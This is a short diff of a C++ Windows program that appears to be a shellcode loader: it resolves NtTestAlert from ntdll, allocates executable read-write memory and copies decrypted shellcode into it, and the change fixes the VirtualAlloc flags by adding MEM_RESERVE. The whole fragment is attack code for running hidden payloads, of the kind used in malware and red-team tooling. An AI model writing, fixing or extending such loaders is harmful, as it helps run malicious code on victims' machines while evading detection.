@@ -176,7 +176,7 @@ int main()
 		myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
 
 		// allocate virtual memory
-		LPVOID shellAddress = VirtualAlloc(NULL, shellDecrypt.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		LPVOID shellAddress = VirtualAlloc(NULL, shellDecrypt.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 
 		// copy the shellcode to the destination
 		memcpy(shellAddress, reinterpret_cast<BYTE*>(shellDecrypt.data()), shellDecrypt.size());
